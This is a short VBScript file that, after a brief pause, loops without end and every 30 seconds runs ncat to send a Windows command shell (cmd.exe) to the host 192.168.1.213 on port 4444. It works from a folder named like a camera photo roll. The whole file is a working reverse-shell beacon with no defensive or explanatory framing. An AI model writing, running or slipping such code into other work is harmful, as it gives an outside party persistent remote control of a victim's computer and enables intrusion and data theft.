WScript.Sleep 3000
Do While True
	Set oShell = CreateObject("Wscript.Shell")
	oShell.run "cd %userprofile%\photos01\camera\roll; ncat 192.168.1.213 4444 -e cmd.exe"
	WScript.Sleep 30000
Loop
